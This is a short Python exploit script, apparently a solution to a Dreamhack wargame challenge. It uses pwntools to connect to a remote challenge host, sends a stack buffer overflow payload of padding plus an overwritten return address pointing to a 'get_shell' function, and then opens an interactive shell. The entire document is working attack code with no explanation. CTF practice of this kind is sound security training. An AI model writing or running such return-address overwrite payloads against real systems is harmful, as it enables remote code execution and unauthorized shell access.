from pwn import * 

p = remote('host3.dreamhack.games', '11244')
get_shell = p64(0x4006aa)
offset = 30

payload = b'a'*offset + b'b'*8 + get_shell

p.sendline(payload)
p.interactive()
